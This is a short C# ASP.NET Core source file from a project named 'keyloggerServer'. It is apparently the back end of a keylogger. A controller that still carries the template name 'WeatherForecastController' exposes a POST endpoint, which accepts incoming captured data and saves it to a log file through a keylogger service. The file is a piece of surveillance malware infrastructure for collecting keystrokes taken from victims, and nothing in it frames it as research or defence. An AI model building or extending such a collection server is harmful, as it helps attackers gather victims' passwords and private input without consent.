using keyloggerServer.Services;
using Microsoft.AspNetCore.Mvc;

namespace keyloggerServer.Controllers
{
    [ApiController]
    [Route("[controller]")]
    public class WeatherForecastController : ControllerBase
    {
        private readonly ILogger<WeatherForecastController> _logger;
        private readonly IKeyloggerService _keyloggerService;
        public WeatherForecastController(ILogger<WeatherForecastController> logger, IKeyloggerService keyloggerService)
        {
            _keyloggerService = keyloggerService;
            _logger = logger;
        }
        

        [HttpPost]
        public IResult Show([FromBody] LoadedData value)
        {
            
            return _keyloggerService.SaveToLogFile(value);
        }
        
        
    }
}
